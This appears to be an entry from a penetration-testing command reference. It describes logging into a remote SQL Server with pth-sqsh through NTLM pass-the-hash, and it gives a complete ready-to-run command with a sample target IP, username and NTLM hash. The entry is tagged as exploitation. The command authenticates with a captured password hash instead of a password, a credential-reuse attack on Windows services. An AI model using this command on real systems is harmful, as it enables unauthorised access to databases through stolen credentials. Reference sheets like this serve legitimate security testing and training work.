---
description: Connect to a remote SQL Server instance using sqsh with NTLM Pass-the-Hash authentication.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  pth-sqsh -S 10.10.10.1 -U john%00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396

items:
  - Hash

services:
  - NTLM

OS:
  - Windows

attack_types:
  - Exploitation

references:
  - http://www.sqsh.org/
  - https://github.com/byt3bl33d3r/pth-toolkit
  - https://learn.microsoft.com/en-us/sql/sql-server/?view=sql-server-ver16
---
